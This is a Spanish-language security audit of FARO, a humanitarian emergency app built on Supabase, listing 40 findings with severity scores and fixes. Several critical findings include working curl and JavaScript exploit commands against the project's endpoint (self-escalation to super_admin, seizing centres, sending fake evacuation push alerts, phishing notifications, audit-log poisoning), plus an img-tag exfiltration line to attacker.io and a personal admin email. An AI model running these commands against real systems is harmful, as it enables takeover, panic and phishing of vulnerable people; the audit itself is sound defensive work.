# FARO — Auditoría de Seguridad Integral — Fase 1

**Fecha:** 4–5 de julio de 2026  
**Alcance:** Código fuente completo: migraciones SQL, RLS, RPCs, frontend, edge functions, headers, PWA, OneSignal, auth, lógica de negocio  
**Metodología:** Revisión adversarial. Asume que el atacante posee: anon key, código compilado, cuenta gratuita, DevTools, Postman, curl, conocimiento completo de Supabase PostgREST.  
**Estado:** Solo diagnóstico. No se han aplicado correcciones.

---

## Índice

- [Resumen Ejecutivo](#resumen-ejecutivo)
- [Matriz de Riesgo](#matriz-de-riesgo)
- [CRÍTICO](#crítico)
- [ALTO](#alto)
- [MEDIO](#medio)
- [BAJO](#bajo)
- [Superficies Positivas](#superficies-positivas)
- [Plan de Remediación](#plan-de-remediación)

---

## Resumen Ejecutivo

FARO ha implementado un modelo de seguridad razonablemente maduro para una aplicación emergente humanitaria. Sin embargo, hay **dos vulnerabilidades críticas que rompen completamente el modelo de roles** y pueden ser explotadas por cualquier usuario autenticado sin herramientas especiales. Adicionalmente, la **Edge Function de push notifications es invocable de forma anónima** con control total sobre el contenido de las notificaciones y los destinatarios.

Los vectores de mayor riesgo inmediato son:

1. **Auto-escalada a `super_admin`** vía UPDATE directo sobre `profiles` (requiere solo estar autenticado).
2. **Toma de control de cualquier centro** vía INSERT en `coordinator_profiles` (requiere solo estar autenticado).
3. **Envío arbitrario de push notifications** a cualquier usuario vía Edge Function sin autenticación.

Estos tres puntos son **release blockers** para cualquier piloto o producción.

| Severidad | Total |
|-----------|-------|
| Crítico   | 5     |
| Alto      | 12    |
| Medio     | 14    |
| Bajo      | 9     |
| **Total** | **40** |

---

## Matriz de Riesgo

```
PROBABILIDAD
  Alta  │ C-03 C-04      │ A-01 A-04 A-05 │ M-02 M-07 M-08  │ B-01
        │ C-05           │ A-08           │ M-10 M-11       │
  Media │ C-01 C-02      │ A-02 A-03 A-06 │ M-01 M-03 M-04  │ B-02 B-03
        │                │ A-07 A-09 A-10 │ M-05 M-06 M-09  │ B-04 B-05
  Baja  │                │ A-11 A-12      │ M-12 M-13 M-14  │ B-06 B-07
        │                │                │                 │ B-08 B-09
        └────────────────┴────────────────┴─────────────────┴──────────
          CRÍTICO           ALTO             MEDIO             BAJO
                             IMPACTO
```

---

## CRÍTICO

### C-01 — Auto-escalada de rol via UPDATE directo sobre `profiles`

| Campo | Detalle |
|-------|---------|
| **Archivo** | `supabase/migrations/20260630260000_phase9_auth_roles_access.sql` |
| **Líneas** | 398–402, 410 |
| **CVSS estimado** | 9.8 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H) |
| **Probabilidad** | Media (requiere cuenta + conocimiento de PostgREST) |

**Evidencia técnica:**

```sql
-- Línea 398–402
CREATE POLICY profiles_update_own ON profiles
  FOR UPDATE TO authenticated
  USING (id = auth.uid())
  WITH CHECK (id = auth.uid());  -- Sin restricción de columnas
```

La política RLS `profiles_update_own` permite que cualquier usuario autenticado actualice **cualquier columna** de su propio perfil, incluyendo `role` y `status`. No existe ningún trigger `BEFORE UPDATE` que bloquee cambios sobre `role`.

**Cómo explotarlo (paso a paso):**

```bash
# 1. Registrar cuenta normal
# 2. Obtener JWT del usuario
curl -X PATCH \
  "https://gfngmbbotqzzchjzgajo.supabase.co/rest/v1/profiles?id=eq.<MI_UUID>" \
  -H "Authorization: Bearer <JWT>" \
  -H "apikey: <ANON_KEY>" \
  -H "Content-Type: application/json" \
  -d '{"role": "super_admin"}'
# 3. Ahora is_super_admin() = true para este usuario
# 4. Llamar a promote_user_role, assign_coordinator_role, approve_coordinator_request,
#    admin_delete_site, etc. — todos pasan porque verifican is_super_admin()
```

**Impacto:** Control total del sistema. Eliminar centros, aprobar coordinadores, ver audit logs, escalar a otros usuarios, bypasear todo.

**Solución recomendada:**
```sql
CREATE OR REPLACE FUNCTION prevent_profile_role_escalation()
RETURNS TRIGGER LANGUAGE plpgsql SECURITY DEFINER AS $$
BEGIN
  IF NEW.role IS DISTINCT FROM OLD.role AND NOT is_super_admin() THEN
    RAISE EXCEPTION 'role_change_forbidden';
  END IF;
  IF NEW.status IS DISTINCT FROM OLD.status AND NOT is_elevated_admin() THEN
    RAISE EXCEPTION 'status_change_forbidden';
  END IF;
  RETURN NEW;
END;
$$;

CREATE TRIGGER trg_prevent_profile_role_escalation
  BEFORE UPDATE ON profiles
  FOR EACH ROW EXECUTE FUNCTION prevent_profile_role_escalation();
```

---

### C-02 — Toma de control de cualquier centro via `coordinator_profiles` self-insert

| Campo | Detalle |
|-------|---------|
| **Archivo** | `supabase/migrations/20260628160000_coordinator_sites_and_cleanup.sql` |
| **Líneas** | 49–58, 60 |
| **CVSS estimado** | 9.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N) |
| **Probabilidad** | Media |

**Evidencia técnica:**

```sql
-- Línea 49–52
CREATE POLICY coordinator_profiles_insert_own ON coordinator_profiles
  FOR INSERT TO authenticated
  WITH CHECK (auth_user_id = auth.uid());
  -- Sin validación de site_id, sin check de request aprobado
```

**Cómo explotarlo:**

```bash
curl -X POST \
  "https://gfngmbbotqzzchjzgajo.supabase.co/rest/v1/coordinator_profiles" \
  -H "Authorization: Bearer <JWT>" \
  -H "apikey: <ANON_KEY>" \
  -H "Content-Type: application/json" \
  -d '{"auth_user_id":"<MI_UUID>","site_type":"hospital","site_id":"<UUID_HOSPITAL>","onboarding_complete":true}'
# Con esto el atacante puede ahora:
# - UPDATE hospitales, refugios, centros de acopio (vía coordinator_update_own_*)
# - INSERT/UPDATE needs para ese centro
# - Revisar y manipular reportes del centro
```

**Impacto:** Apropiación de cualquier centro activo. Corrupción de inventario, manipulación de reportes, sabotaje en operaciones humanitarias.

**Solución recomendada:**
```sql
-- Eliminar políticas de INSERT/UPDATE directas en coordinator_profiles
DROP POLICY coordinator_profiles_insert_own ON coordinator_profiles;
DROP POLICY coordinator_profiles_update_own ON coordinator_profiles;
-- Solo permitir escritura via RPCs approve_coordinator_request y assign_coordinator_role
-- Agregar columna assigned_by UUID NOT NULL DEFAULT NULL para trazabilidad
```

---

### C-03 — Edge Function `send-notification-push` sin autenticación

| Campo | Detalle |
|-------|---------|
| **Archivo** | `supabase/functions/send-notification-push/index.ts` |
| **Líneas** | 37–40, 51–64, 79–88, 105–110; `supabase/config.toml` líneas 6–7 |
| **CVSS estimado** | 9.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:H/A:H) |
| **Probabilidad** | Alta (función de Supabase públicamente accesible) |

**Evidencia técnica:**

```toml
# supabase/config.toml línea 6–7
[functions.send-notification-push]
verify_jwt = false
```

```typescript
// index.ts línea 37–40: no hay ninguna verificación de Authorization header
// El handler acepta cualquier POST y procesa el payload directo
const payload = await req.json()  // l.51 — confianza total en el body
const userId = payload.record?.user_id  // l.62 — user_id controlado por atacante
```

**Cómo explotarlo:**

```bash
# Enviar push de "EVACUACIÓN" a cualquier usuario
curl -X POST \
  "https://gfngmbbotqzzchjzgajo.supabase.co/functions/v1/send-notification-push" \
  -H "Content-Type: application/json" \
  -d '{
    "type":"INSERT","table":"notifications",
    "record":{
      "id":"00000000-0000-0000-0000-000000000001",
      "user_id":"<VICTIM_UUID>",
      "title":"EVACUACIÓN INMEDIATA",
      "message":"Dirígete a la salida de emergencia. FARO.",
      "type":"emergency","priority":"critical","push_sent":false
    }
  }'
# Con user_ids de todos los usuarios activos → pánico masivo coordinado
```

**Impacto:** Phishing por push, pánicos falsos en emergencias, suplantación de alertas oficiales, DoS por saturación de notificaciones.

**Solución recomendada:**
1. Añadir verificación de webhook secret: `X-Webhook-Secret: <shared-secret>` configurado en Supabase Database Webhook.
2. En el handler, re-leer la notificación de la DB via `service_role` y validar que `push_sent=false` antes de enviar.
3. Nunca usar campos del body como fuente de verdad para `title`/`message` — leerlos de la DB.

---

### C-04 — `notify_coordinator_request_user` RPC sin autorización, GRANT a `authenticated`

| Campo | Detalle |
|-------|---------|
| **Archivo** | `supabase/migrations/20260630264000_coordinator_decision_notifications.sql` |
| **Líneas** | 274–275 (GRANT); función reemplazada en `20260703200000_notification_system.sql` líneas 547–576 |
| **CVSS estimado** | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:H/A:H) |
| **Probabilidad** | Alta |

**Evidencia técnica:**

```sql
-- 20260630264000_coordinator_decision_notifications.sql, línea 274–275
GRANT EXECUTE ON FUNCTION notify_coordinator_request_user(...) TO authenticated;
-- La función es SECURITY DEFINER y no tiene ningún IF NOT is_elevated_admin() THEN RAISE
```

**Cómo explotarlo:**

```javascript
// Desde el cliente de cualquier usuario autenticado
await supabase.rpc('notify_coordinator_request_user', {
  p_user_id: '<CUALQUIER_USER_UUID>',
  p_type: 'coordinator_request_approved',
  p_title: 'Tu solicitud fue aprobada',
  p_body: 'Ingresa a http://sitio-malicioso.com para continuar',
  p_metadata: {},
  p_request_id: '00000000-0000-0000-0000-000000000001'
})
// → Inserta notificación en DB → Webhook → Edge Function → Push al dispositivo
```

**Impacto:** Phishing dirigido, acoso, desinformación operacional durante la emergencia.

**Solución recomendada:**
```sql
REVOKE EXECUTE ON FUNCTION notify_coordinator_request_user(...) FROM authenticated;
-- Solo llamable desde otras funciones SECURITY DEFINER o service_role
```

---

### C-05 — `log_auth_event` RPC sin autorización, GRANT a `authenticated` (audit log poisoning)

| Campo | Detalle |
|-------|---------|
| **Archivo** | `supabase/migrations/20260630260000_phase9_auth_roles_access.sql` |
| **Líneas** | 197–217 |
| **CVSS estimado** | 7.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H) |
| **Probabilidad** | Alta |

**Evidencia técnica:**

```sql
-- Línea 215–217
GRANT EXECUTE ON FUNCTION log_auth_event(TEXT, UUID, JSONB) TO authenticated;
-- La función no verifica el rol del llamante
-- p_action, p_target_user_id, p_metadata son 100% controlados por el cliente
```

**Cómo explotarlo:**

```javascript
await supabase.rpc('log_auth_event', {
  p_action: 'role_changed',
  p_target_user_id: '<VICTIM_UUID>',
  p_metadata: { new_role: 'super_admin', changed_by: 'system' }
})
// → Genera entrada falsa en auth_audit_logs
// → Administradores ven audit trail adulterado
// → Flood de 10,000 entradas oculta eventos legítimos
```

**Impacto:** Destrucción de evidencia forense. Imposibilidad de audit trail confiable post-incidente.

**Solución recomendada:**
```sql
REVOKE EXECUTE ON FUNCTION log_auth_event(...) FROM authenticated;
-- Mantener solo llamadas desde funciones SECURITY DEFINER internas
-- Agregar validación de p_action contra whitelist interno
```

---

## ALTO

### A-01 — `is_admin()` acepta JWT email como criterio de autorización (sin verificación de perfil)

| Campo | Detalle |
|-------|---------|
| **Archivo** | `supabase/migrations/20260630260000_phase9_auth_roles_access.sql` |
| **Líneas** | 141–154 |
| **Archivo adicional** | `supabase/migrations/20260629180000_admin_site_management.sql` líneas 6–8 |
| **CVSS estimado** | 8.6 |

**Evidencia:**

```sql
CREATE OR REPLACE FUNCTION is_admin() RETURNS BOOLEAN AS $$
  SELECT EXISTS (
    SELECT 1 FROM admin_emails WHERE email = lower(auth.jwt() ->> 'email')
  ) OR is_elevated_admin() OR is_super_admin();
$$ LANGUAGE sql STABLE SECURITY DEFINER;
```

Email `vicentejmn80@gmail.com` está hardcodeado en `admin_emails`. Si un atacante logra registrar una cuenta OAuth con ese email antes que el legítimo admin, obtiene `is_admin() = true` → puede DELETE centros, DELETE necesidades, ver todos los perfiles.

**Solución:** Deprecar `admin_emails`. `is_admin()` debe delegar exclusivamente a `profiles.role`. Bootstrap via service-role script, no en migration.

---

### A-02 — `approve_coordinator_request` no valida que el sitio exista

| Campo | Detalle |
|-------|---------|
| **Archivo** | `supabase/migrations/20260630264000_coordinator_decision_notifications.sql` |
| **Líneas** | 123–173 |
| **CVSS estimado** | 6.5 |

Sin llamada a `assert_valid_site_reference()`. Admin malintencionado o comprometido puede aprobar solicitudes con UUIDs de sitios inexistentes o de otro tipo, generando coordinadores huérfanos con permisos incoherentes.

**Solución:** Agregar `PERFORM assert_valid_site_reference(p_assigned_site_type, p_assigned_site_id);` al inicio de la función.

---

### A-03 — `approve_coordinator_request` puede sobrescribir el rol de un `regional_admin`

| Campo | Detalle |
|-------|---------|
| **Archivo** | `supabase/migrations/20260630264000_coordinator_decision_notifications.sql` |
| **Líneas** | 135–141 |
| **CVSS estimado** | 6.5 |

La función hace `UPDATE profiles SET role = 'coordinator'` sin verificar el rol actual. Un `regional_admin` que enviara una solicitud de coordinador vería su rol degradado.

**Solución:** Agregar `WHERE role NOT IN ('regional_admin', 'super_admin')` al UPDATE.

---

### A-04 — Eventos table con INSERT abierto a cualquier usuario autenticado

| Campo | Detalle |
|-------|---------|
| **Archivo** | `supabase/migrations/20260630203000_phase5_events_orgs_realtime.sql` |
| **Líneas** | 47–51, 54 |
| **CVSS estimado** | 7.2 |

```sql
CREATE POLICY system_insert_events ON events
  FOR INSERT TO authenticated
  WITH CHECK (true);  -- Sin restricción
```

Cualquier usuario autenticado puede insertar en `events`, que es la timeline pública de FARO visible por todos. Puede generar false alerts, desinformación operacional ("Centro X cerrado", "Ruta bloqueada").

**Solución:** Eliminar esta política. Los eventos solo deben crearse via triggers SECURITY DEFINER (que ya existen).

---

### A-05 — Personas (PII) accesibles públicamente a anónimos

| Campo | Detalle |
|-------|---------|
| **Archivo** | `supabase/migrations/20260628151800_rls_public_access.sql` |
| **Líneas** | 35–39 |
| **CVSS estimado** | 7.5 |

```sql
CREATE POLICY public_read_persons ON persons
  FOR SELECT TO anon, authenticated
  USING (deleted_at IS NULL);  -- Todos los registros de personas
```

Nombres, estado (herido/fallecido/encontrado), vinculación a hospital/refugio accesibles sin autenticación. En un contexto humanitario esto es crítico: puede ser usado para localizar personas vulnerables, confirmar fallecidos a terceros, etc.

**Solución:** Restringir SELECT en `persons` a coordinadores y admins. Crear vista pública solo con estadísticas agregadas.

---

### A-06 — Rate limiting bypasseable via IP spoofing (X-Forwarded-For)

| Campo | Detalle |
|-------|---------|
| **Archivo** | `supabase/migrations/20260630270000_security_hardening.sql` |
| **Líneas** | 26–52, 105–107 |
| **CVSS estimado** | 7.5 |

```sql
-- security_client_ip() confía en la primera cabecera X-Forwarded-For
CREATE OR REPLACE FUNCTION security_client_ip() RETURNS TEXT AS $$
  coalesce(
    current_setting('request.headers', true)::json->>'x-forwarded-for',
    current_setting('request.headers', true)::json->>'x-real-ip',
    'unknown'
  )
$$ ...
```

Spoofear el header `X-Forwarded-For` rota el `actor_key` → se pueden saltear los 15 reportes/hora del anon o los 5 solicitudes/día del coordinator request.

**Solución:** No confiar en headers de cliente para rate limiting. Usar exclusivamente `auth.uid()` para autenticados y dejar las IPs como contexto secundario no controlable.

---

### A-07 — Storage buckets públicos (reports-images, person-lists)

| Campo | Detalle |
|-------|---------|
| **Archivo** | `supabase/migrations/20260630203000_phase5_events_orgs_realtime.sql` |
| **Líneas** | 58–66 |
| **CVSS estimado** | 6.5 |

Los buckets están configurados con `public = true`, lo que significa que cualquier URL conocida o predecible se puede acceder sin autenticación. Las imágenes de reportes pueden incluir fotos de víctimas, documentos internos, etc.

**Solución:** Buckets privados con signed URLs generadas server-side (Storage Signed URLs API). Caduca en 1 hora.

---

### A-08 — Realtime activo en tablas sensibles: `profiles`, `coordinator_profiles`, `notifications`

| Campo | Detalle |
|-------|---------|
| **Archivo** | `supabase/migrations/20260703190000_profile_realtime_sync.sql` |
| **Líneas** | 1–20 |
| **CVSS estimado** | 6.1 |

`profiles` y `coordinator_profiles` están en la publicación realtime. Cualquier admin suscrito recibe cambios de rol en tiempo real de todos los usuarios. Un admin comprometido puede monitorear actividad de otros coordinadores.

**Solución:** Remover `profiles`/`coordinator_profiles` de Realtime a menos que haya caso de uso específico. Filtrar canales por `user_id`.

---

### A-09 — UPDATE directo sobre `coordinator_requests.status` bypasea el workflow de aprobación

| Campo | Detalle |
|-------|---------|
| **Archivo** | `supabase/migrations/20260630260000_phase9_auth_roles_access.sql` |
| **Líneas** | 435–439 |
| **CVSS estimado** | 6.5 |

La política `coordinator_requests_admin_update` permite UPDATE directo por elevated admins. Haciendo `UPDATE coordinator_requests SET status='approved'` sin llamar al RPC `approve_coordinator_request`, el usuario NO recibe el role de coordinator en `profiles`, generando un estado inconsistente.

**Solución:** Revocar UPDATE directo. Forzar flujo por RPC. Trigger que rechace cambios de `status` excepto via RPCs internas.

---

### A-10 — Múltiples coordinadores por sitio posible via self-insert (sin unicidad)

| Campo | Detalle |
|-------|---------|
| **Archivo** | `supabase/migrations/20260628160000_coordinator_sites_and_cleanup.sql` |
| **Líneas** | 49–60 |
| **CVSS estimado** | 6.1 |

No hay `UNIQUE` en `(site_type, site_id)` para `coordinator_profiles`. Múltiples atacantes pueden reclamar el mismo hospital → conflictos de inventario, reportes inconsistentes.

**Solución:** `CREATE UNIQUE INDEX coordinator_profiles_site_unique ON coordinator_profiles (site_type, site_id) WHERE status = 'active';`

---

### A-11 — `validate_need_write` no verifica pertenencia del coordinador al centro

| Campo | Detalle |
|-------|---------|
| **Archivo** | `supabase/migrations/20260630270000_security_hardening.sql` |
| **Líneas** | 325–361 |
| **CVSS estimado** | 5.8 |

El trigger de validación verifica formato y límites, pero no verifica que `NEW.needable_id` corresponda a un centro del cual el llamante es coordinador. Dependencia total de RLS.

**Solución:** Agregar verificación en trigger usando `coordinator_profiles` para autenticados.

---

### A-12 — `regional_admin_insert_*` no restringe `status` en INSERT (permite estados arbitrarios)

| Campo | Detalle |
|-------|---------|
| **Archivo** | `supabase/migrations/20260702280000_center_extended_fields.sql` |
| **Líneas** | 169–182 |
| **CVSS estimado** | 5.5 |

```sql
CREATE POLICY regional_admin_insert_supply_centers ON supply_centers
  FOR INSERT TO authenticated
  WITH CHECK (is_elevated_admin());  -- Sin restricción de status
```

Admin puede crear centros con `status = 'hidden'` o cualquier string arbitrario. Columna `status` es `VARCHAR(50)` sin CHECK constraint.

**Solución:** Restaurar `WITH CHECK (is_elevated_admin() AND status = 'active')`. Agregar `CHECK (status IN ('active', 'inactive', 'archived'))` en schema.

---

## MEDIO

### M-01 — `public_read_needs` expone inventario completo a anónimos (`USING (true)`)

**Archivo:** `20260628151800_rls_public_access.sql`, líneas 29–33  
**CVSS:** 5.3  
Inventario de hospitales y refugios (qué falta, cantidades) accesible sin autenticación. Potencial para manipulación por actores externos.

---

### M-02 — Enumeración de cuentas via mensajes de error de auth

**Archivo:** `src/lib/auth-errors.ts`, líneas 4–22; `src/screens/auth-screen.tsx`, línea 128–129  
**CVSS:** 5.3  
Mensajes distintos para "email no registrado", "contraseña incorrecta", "email no confirmado". Permite enumerar cuentas activas mediante automatización.  
**Solución:** Un único mensaje genérico: "Credenciales incorrectas o cuenta no verificada."

---

### M-03 — CAPTCHA con fallo abierto si `VITE_RECAPTCHA_SITE_KEY` no está configurada

**Archivo:** `src/screens/auth-screen.tsx`, líneas 56–60; `src/services/auth-service.ts`, líneas 30–41  
**CVSS:** 6.1  
Si la variable no está en Vercel, el CAPTCHA retorna `undefined` y auth procede sin verificación bot. El placeholder `your-recaptcha-site-key` en `.env` confirma que puede desplegarse sin configurar.  
**Solución:** Fail closed en producción: si la variable falta, bloquear auth y alertar.

---

### M-04 — Datos operacionales cacheados en `localStorage` sin cifrado ni expiración robusta

**Archivo:** `src/hooks/useFaroData.ts`, líneas 21–45, 109–123  
**CVSS:** 5.3  
Snapshot completo de centros, necesidades, reportes, eventos en `localStorage` (`faro.cache.v1`). En dispositivos compartidos o con XSS, expone inteligencia operacional completa.  
**Solución:** TTL corto (5 min), sessionStorage para datos sensibles, limpiar en logout.

---

### M-05 — Tokens de sesión Supabase en `localStorage` (XSS = secuestro de sesión)

**Archivo:** `src/lib/supabase.ts`, línea 29  
**CVSS:** 6.1  
`sb-*-auth-token` con refresh token almacenado en localStorage por defecto. Cualquier XSS lo exfiltra.  
**Solución:** Evaluar modo `@supabase/ssr` con cookies HttpOnly; o expiración corta de JWT + monitoreo.

---

### M-06 — Filtro PostgREST con interpolación directa de email (injection potencial)

**Archivo:** `src/repositories/auth-repository.ts`, líneas 132–138  
**CVSS:** 5.4  
```javascript
query.or(`auth_user_id.eq.${userId},and(email.eq.${email},auth_user_id.is.null)`)
```
Si el email tuviera caracteres PostgREST (`(),.`) podría alterar la lógica del filtro.  
**Solución:** Usar filtros parametrizados separados, nunca concatenación en `.or()`.

---

### M-07 — Debug de push notifications habilitado en producción via env flag

**Archivo:** `src/push-provider/onesignal-push-provider.ts`, líneas 8, 108–116; `src/lib/push-debug-buffer.ts`, líneas 21–23  
**CVSS:** 4.3  
`VITE_PUSH_DEBUG=true` activo en Vercel expone logs con player IDs, estado de suscripción, errores internos a cualquier usuario con `?pushdebug=1`.

---

### M-08 — Push debug panel accesible via query param en producción

**Archivo:** `src/lib/push-debug-buffer.ts`, líneas 25–37; `src/components/dev/PushDebugPanel.tsx`, línea 35  
**CVSS:** 4.3  
Con `VITE_PUSH_DEBUG=true` y `?pushdebug=1`, el panel completo de diagnóstico push (con copy-to-clipboard) está visible para cualquier usuario.  
**Solución:** `import.meta.env.DEV` guard estricto; eliminar del bundle de producción.

---

### M-09 — Scripts de OneSignal sin Subresource Integrity (SRI)

**Archivo:** `index.html`, línea 18; `public/push/onesignal/OneSignalSDKWorker.js`, línea 1  
**CVSS:** 5.9  
SDK de tercero cargado desde CDN sin `integrity=""`. Compromiso del CDN = inyección de código en contexto de la app y del service worker.

---

### M-10 — CSP permite `style-src 'unsafe-inline'`

**Archivo:** `vercel.json`, líneas 32–33  
**CVSS:** 4.7  
Estilos inline habilitados en todos los paths. Debilita el valor de la CSP contra ataques XSS chained.

---

### M-11 — CSP `img-src https:` demasiado permisivo

**Archivo:** `vercel.json`, línea 33  
**CVSS:** 4.3  
Permite imágenes desde cualquier HTTPS. Con XSS se puede exfiltrar datos via `<img src="https://attacker.io/?d=leak">`.

---

### M-12 — Inline script en `index.html` conflictúa con CSP declarada

**Archivo:** `index.html`, línea 17; `vercel.json`, línea 33  
**CVSS:** 4.3  
`window.OneSignalDeferred = []` es un script inline. La CSP actual no tiene `'unsafe-inline'` ni nonce para scripts → el script puede estar siendo bloqueado silenciosamente o se añadió una excepción no documentada.

---

### M-13 — `push_sent` leído del body del webhook, no de la base de datos (replay)

**Archivo:** `supabase/functions/send-notification-push/index.ts`, líneas 62–64, 122  
**CVSS:** 5.8  
Atacante (con C-03) puede repetir el POST con `push_sent: false` para enviar la misma notificación múltiples veces al mismo usuario.  
**Solución:** `SELECT push_sent FROM notifications WHERE id = $1 FOR UPDATE` antes de enviar.

---

### M-14 — Metadatos de build expuestos a todos los usuarios autenticados

**Archivo:** `src/lib/build-info.ts`, líneas 2–15; `src/screens/profile-screen.tsx`, líneas 132–133  
**CVSS:** 3.7  
Commit SHA y fecha de build visible en el perfil de cada usuario. Permite mapear versión a vulnerabilidades conocidas del repositorio.  
**Solución:** Mostrar solo a admins, o usar ID opaco no vinculado a git.

---

## BAJO

### B-01 — `enforce_rate_limit` concedido a `anon` y `authenticated`

**Archivo:** `20260630270000_security_hardening.sql`, líneas 105–107  
**CVSS:** 3.1  
Usuarios pueden auto-DoS su propio bucket de rate limiting antes de acciones legítimas.

---

### B-02 — `coordinator_request_center_name` accesible a todos los autenticados

**Archivo:** `20260630264000_coordinator_decision_notifications.sql`, línea 274  
**CVSS:** 3.7  
Enumera nombres de centros por UUID. Reconocimiento para ataques dirigidos.

---

### B-03 — `promote_user_role` y otros RPCs admin con GRANT a `authenticated`

**Archivo:** `20260630261000_promote_user_role.sql`, línea 44  
**CVSS:** 3.1 (baja mientras C-01 esté sin parchear esta es consecuencia, no causa)  
Defensa en profundidad: los RPCs admin deberían ser GRANT solo a `service_role`.

---

### B-04 — Logs de signup pueden incluir PII en producción

**Archivo:** `src/lib/signup-debug.ts`, líneas 1–6; `src/services/auth-service.ts`, línea 45  
**CVSS:** 2.7  
`VITE_SIGNUP_DEBUG=1` loguea emails en consola.

---

### B-05 — Proyecto ref y OneSignal App ID en docs committeados

**Archivo:** `ONESIGNAL_SETUP.md`, líneas 7, 13, 29–30; `supabase/config.toml`, líneas 2–4  
**CVSS:** 2.5  
El project ref de Supabase y el App ID de OneSignal están en el repositorio. El App ID es públicamente visible por diseño, pero el project ref facilita reconocimiento.

---

### B-06 — Headers de aislamiento cross-origin ausentes (COOP/CORP/COEP)

**Archivo:** `vercel.json`, líneas 28–43  
**CVSS:** 2.5  
`Cross-Origin-Opener-Policy`, `Cross-Origin-Resource-Policy` ausentes. Impacto mínimo para esta SPA.

---

### B-07 — `Permissions-Policy` no menciona explícitamente `notifications`

**Archivo:** `vercel.json`, líneas 38–41  
**CVSS:** 1.5  

---

### B-08 — Edge Function retorna HTTP 200 en todos los errores

**Archivo:** `supabase/functions/send-notification-push/index.ts`, líneas 132–145  
**CVSS:** 2.5  
Failures silenciosos impiden monitoreo efectivo.

---

### B-09 — `public_read_events` y `public_read_organizations` con `USING (true)`

**Archivo:** `20260630203000_phase5_events_orgs_realtime.sql`, líneas 17–21, 41–45  
**CVSS:** 3.1  
Timeline completa de eventos accesible a anónimos. Inteligencia operacional observable.

---

## Superficies Positivas

Los siguientes controles están correctamente implementados:

| Control | Estado | Archivo |
|---------|--------|---------|
| `frame-ancestors 'none'` + `X-Frame-Options: DENY` | ✅ | `vercel.json` |
| HSTS 2 años con preload | ✅ | `vercel.json` |
| `X-Content-Type-Options: nosniff` | ✅ | `vercel.json` |
| `Referrer-Policy: strict-origin-when-cross-origin` | ✅ | `vercel.json`, `index.html` |
| `validate_coordinator_request_write` trigger | ✅ | `20260630270000` |
| `admin_register_center` RPC con `is_elevated_admin()` | ✅ | `20260702280000` |
| `require_role.tsx` en pantallas admin/system | ✅ | `src/components/auth/` |
| Tokens OneSignal REST solo en Edge Function env | ✅ | `send-notification-push/index.ts` |
| `create_notification` NOT GRANT a `authenticated` | ✅ | `20260703200000` |
| Anon REVOKE en centros y needs (`20260630270000`) | ✅ | Security hardening |
| RLS en `notifications`/`preferences` — own-row only | ✅ | `20260703200000` |
| `validate_center_write` trigger con bounds check | ✅ | `20260630270000` |
| `prevent_role_downgrade` en `promote_user_role` | ✅ | `20260630261000` |
| Double-submit mutex en auth forms | ✅ | `auth-screen.tsx` |

---

## Plan de Remediación

### Bloqueo 0 — INMEDIATO (antes de cualquier piloto)

> Estos issues permiten que cualquier usuario autenticado tome control del sistema.

| ID | Hallazgo | Archivo | Complejidad |
|----|---------|---------|-------------|
| C-01 | Trigger anti-escalada de rol en `profiles` | Nueva migración | Baja |
| C-02 | Eliminar políticas INSERT/UPDATE en `coordinator_profiles` | Nueva migración | Baja |
| C-03 | Autenticar Edge Function push (webhook secret) | `send-notification-push/index.ts` + config | Media |
| C-04 | `REVOKE notify_coordinator_request_user FROM authenticated` | Nueva migración | Mínima |
| C-05 | `REVOKE log_auth_event FROM authenticated` | Nueva migración | Mínima |

---

### Bloqueo 1 — ESTA SEMANA (antes de piloto externo)

| ID | Hallazgo | Complejidad |
|----|---------|-------------|
| A-01 | Deprecar `admin_emails` en `is_admin()` | Baja |
| A-04 | Eliminar `system_insert_events` (INSERT abierto a auth) | Mínima |
| A-05 | Restringir `persons` SELECT a coordinadores/admins | Media |
| A-07 | Buckets privados + signed URLs | Media |
| A-08 | Remover `profiles` de Realtime | Mínima |
| M-03 | CAPTCHA fail-closed en producción | Baja |
| M-13 | Idempotencia push via DB SELECT FOR UPDATE | Baja |

---

### Bloqueo 2 — SIGUIENTE SPRINT (hardening)

| ID | Hallazgo | Complejidad |
|----|---------|-------------|
| A-02 | Validar site en `approve_coordinator_request` | Baja |
| A-03 | Guard anti-downgrade en `approve_coordinator_request` | Mínima |
| A-06 | Rate limiting independiente de headers | Media |
| A-09 | Trigger que bloquee UPDATE directo de `status` en coordinator_requests | Baja |
| A-10 | UNIQUE index en `coordinator_profiles (site_type, site_id)` | Mínima |
| A-12 | Restaurar `WITH CHECK (status = 'active')` en INSERT policies | Mínima |
| M-02 | Mensajes de auth genéricos | Baja |
| M-04 | TTL de caché + limpieza en logout | Baja |
| M-06 | Parametrizar filtros PostgREST | Baja |
| M-07/08 | Remover debug push del bundle de producción | Baja |
| M-09 | SRI o self-hosting del SDK OneSignal | Alta |

---

### Bloqueo 3 — ANTES DE PRODUCCIÓN (madurez)

| ID | Hallazgo | Complejidad |
|----|---------|-------------|
| A-11 | Verificación de pertenencia en `validate_need_write` | Media |
| M-05 | Evaluar cookies HttpOnly para sesión Supabase | Alta |
| M-10 | Eliminar `unsafe-inline` de CSP styles | Alta (requiere nonces en Tailwind) |
| M-11 | Restringir `img-src` a orígenes conocidos | Baja |
| M-12 | Mover OneSignal init a módulo bundleado | Media |
| M-14 | Build info solo visible a admins | Baja |
| B-01 | `REVOKE enforce_rate_limit FROM authenticated` | Mínima |
| B-03 | `REVOKE` admin RPCs de `authenticated`, grant a `service_role` | Media |

---

## Instrucciones para el siguiente paso

Una vez aprobado este diagnóstico, el proceso de remediación será:

1. **Bloqueo 0:** Una sola migración SQL + cambio en la Edge Function. Verificación con casos de prueba adversariales.
2. **Bloqueo 1:** Batch de migraciones SQL. Verificación con Postman/curl como atacante.
3. **Bloqueos 2–3:** Sprints incrementales con re-test automatizado de cada punto.

Cada corrección generará una migración idempotente versionada. No se modificarán migraciones históricas existentes.

---

*Documento generado como diagnóstico de solo lectura. No se han aplicado cambios al código.*  
*Próximo paso: confirmar prioridades y comenzar Fase de Remediación.*
